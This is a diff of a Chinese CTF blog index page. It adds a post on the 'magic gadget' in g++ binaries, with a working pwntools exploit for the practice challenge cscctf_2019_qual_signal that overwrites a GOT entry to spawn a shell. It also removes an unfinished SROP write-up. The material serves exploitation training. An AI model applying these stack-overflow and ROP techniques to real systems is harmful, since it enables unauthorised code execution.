@@ -155,6 +155,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/29/Magic-gadget/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/29/Magic-gadget/" class="post-title-link" itemprop="url">Magic-gadget</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-29 13:03:35" itemprop="dateCreated datePublished" datetime="2022-01-29T13:03:35+08:00">2022-01-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-31 13:14:05" itemprop="dateModified" datetime="2022-01-31T13:14:05+08:00">2022-01-31</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>如果一个程序是用 g++ 编译的，则会存在如下gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add dword ptr [rbp - 0x3b],ebx;</span><br><span class="line">nop dword ptr [rax + rax];</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>这个gadget基本出现在<code>__do_global_dtors_au</code>这个函数里面，然而一般ida打开，点开这个函数但是看不到这个gadget，原因是因为这个gadget是通过错位得到的。</p>
+<p>一般可以通过ROPgadget来搜索得到，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary cscctf_2019_qual_signal| grep ret | grep &quot;\[rbp&quot; </span><br><span class="line">0x0000000000400618 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004006dc : mov eax, dword ptr [rbp - 0x108] ; leave ; ret</span><br><span class="line">0x00000000004006db : mov rax, qword ptr [rbp - 0x108] ; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>在存在溢出的情况下，可以使用ret2csu来控制rbp与rbx，结合如上gadget就可以实现任意地址写</p>
+<h3 id="cscctf-2019-qual-signal"><a href="#cscctf-2019-qual-signal" class="headerlink" title="cscctf_2019_qual_signal"></a>cscctf_2019_qual_signal</h3><p>程序保护如下</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-checksec.png" class>
+
+<p>程序主逻辑如下</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-main.jpg" class>
+
+<p>可见是一个简单的栈溢出，但是程序中没有使用输出函数，所以如果要泄漏libc的话会比较麻烦</p>
+<p>我们注意到程序中有 <code>__do_global_dtors_au</code>这个函数，所以我们用ROPgadget搜索一下那个gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary cscctf_2019_qual_signal| grep ret | grep &quot;\[rbp&quot; </span><br><span class="line">0x0000000000400618 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004006dc : mov eax, dword ptr [rbp - 0x108] ; leave ; ret</span><br><span class="line">0x00000000004006db : mov rax, qword ptr [rbp - 0x108] ; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这个gadget存在，所以能利用这个gadget来任意地址写，又got表是可写的，所以我们随便修改一个函数的got表为 one_gadget 一把梭即可。</p>
+<p>因为用one_gadget找的时候默认的都不太符合条件，所以加个 -l2 的参数来找</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-one_gadget.png" class>
+
+<p>可见 0xe569f 处的 one_gadget 是我们能用的，因为 ret2csu 的时候我们可以顺便控制 r12 和 r14。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26066</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">csu = <span class="number">0x40074A</span></span><br><span class="line">one_gadget = <span class="number">0xe569f</span>-<span class="number">0x110070</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">payload += p64(<span class="number">0x40074A</span>)</span><br><span class="line">payload += p64(one_gadget&amp;<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x400618</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>0xe569f-0x110070</code> 是负数，我们不能直接将负数赋值给一个寄存器，所以我们可以用 <code>&amp;0xffffffffffffffff </code>这样的方法来表示一个负数，或者也可以 <code>+0x10000000000000000</code> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/18/qctf2018-stack2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1021,97 +1112,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/06/SROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/06/SROP/" class="post-title-link" itemprop="url">SROP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-06 21:43:55" itemprop="dateCreated datePublished" datetime="2021-12-06T21:43:55+08:00">2021-12-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-17 20:34:40" itemprop="dateModified" datetime="2021-12-17T20:34:40+08:00">2021-12-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SROP（没写完）"><a href="#SROP（没写完）" class="headerlink" title="SROP（没写完）"></a>SROP（没写完）</h2><h4 id="一些比较好的文章"><a href="#一些比较好的文章" class="headerlink" title="一些比较好的文章"></a>一些比较好的文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85810">【技术分享】Sigreturn Oriented Programming攻击简介 - 安全客，安全资讯平台 (anquanke.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luozhaotian/article/details/79607572"> SROP基本原理和利用</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1081">SROP_「二进制安全pwn基础」 - 网安 (wangan.com)</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]</a></p>
-<p>SROP利用了Linux系统信号处理过程中的漏洞：在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。其中“处理完后再读取栈中的数据恢复寄存器中的值”就是 sigreturn 系统调用的作用，它会读取当前栈空间中的数据并传给相应寄存器。</p>
-<p>sigreturn 系统调用会改变所有寄存器的值，包括RSP/ESP与RBP/EBP的值，所以虽然可以利用SROP来实现任何想要的系统调用，但是同时其会改变栈顶指针，有时候这不是我们想要的。</p>
-<p>综上，SROP的攻击思路就是利用栈溢出设置返回地址为 sigreturn 系统调用的gadget，然后在栈上布置对应寄存器的数据，待 sigreturn 系统调用结束，所以寄存器的值都会变成我们布置在栈上的值。</p>
-<p>完成一次 SROP 攻击需要具备四个条件：</p>
-<ol>
-<li>存在栈溢出漏洞，使得栈上的数据可控</li>
-<li>需要知道 ‘/bin/sh’ 的地址，如果是自己构造在栈上的，那就需要知道栈的地址</li>
-<li>需要知道 syscall 指令在内存中的地址</li>
-<li>需要知道 sigreturn 系统调用的内存地址（这个单独的gadget并不是必须的，因为 sigreturn 也是一个系统调用，只要令 <code>rax = 15</code> 或 <code>eax = 77 </code> ，然后再调用 syscall 指令，就相当于调用了 sigreturn ）</li>
-</ol>
-<h3 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h3><p>整个程序的代码段只有如下部分</p>
-<img src="/2021/12/06/SROP/assembly.jpg" class>
-
-<p>反汇编如下</p>
-<img src="/2021/12/06/SROP/start.jpg" class>
-
-<p>从汇编代码来看，程序只是做了将相应的寄存器赋值的工作，然后就执行 <code>syscall_ret</code> 了，其中从 <code>mov rsi,rsp</code> 可知 read() 在栈顶处写入内容，结合汇编代码可知 <code>ret</code> 返回的地址也是栈顶中的内容，所以我们输入的前八个字节可以控制返回地址。</p>
-<p>因为程序只有这么些代码，显然需要我们手动构造系统调用来getshell，显然因为我们能利用的汇编段有限，所以大部分寄存器的值都无法直接被我们修改，所以这时我们可以利用 SROP 来将我们想修改的寄存器修改为对应值，而要调用 sigreturn 则需要 rax = 15 ，也就是系统调用号 = 15，那么怎么控制 rax 的值？我们需要知道read() 的返回值存放在 rax 中，而 read() 的返回值就是其读取的字节数，那么我们就可以通过控制输入的字节数来控制 rax 寄存器进而调用 sigreturn 。</p>
-<p>因为我们最终需要通过 SROP 来调用 <code>execve(&quot;/bin/sh&quot;,0,0)</code> ，所以我们还需要泄漏栈上的地址，否则无法计算出 “/bin/sh” 所在的地址。所以我们需要先调用一个输出函数，延续上述思路，我们通过控制输入的字节数来控制 rax ，同时在本题中合适的输出函数似乎只有 write() ，而 write() 的系统调用号为 1 ，我们需要做到：①只输入一个字节的同时控制返回地址。②write() 函数调用完后的返回地址也需要控制。</p>
-<p>那么怎么实现呢？我们可以在第一次输入时就将返回地址写入栈上，我们输入三个 <code>p64(0x4000B0)</code> ，第一个用来控制这次调用的返回，然后我们在第二次输入时输入 ‘\xb3’ 来将第一次输入时写入栈上的 ‘0x4000B0’ 的低字节的 ‘\xb0’ 覆盖掉，这样就控制了第二次的返回地址为 ‘0x4000B3’ ，返回到 ‘0x4000B3’ 是为了跳过 ‘0x4000B0’ 处的 <code>xor rax, rax</code> ，否则 rax 就被置0了。第二次返回之后就会调用 <code>write(1,&#39;rsp&#39;,0x400)</code> ，输出位于栈上的 0x400 个字节的数据，这其中肯定有栈上的地址，这样就完成了泄漏的工作，同时我们第一次输入时的第三个 ‘0x4000B0’ 控制了 write() 的返回，此后程序就会再调用一次 read() ，我们就可以继续后面的操作。</p>
-<p>read函数输入15个字节后返回到 b3 ，== 调用 sigreturn，后面要接 sigfram</p>
-<p>sigfram 和 ‘/bin/sh’ 一起send，这次在15字节之前send，所以要两次read</p>
-<p>现在这次send sig和bin ，</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1181,7 +1181,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
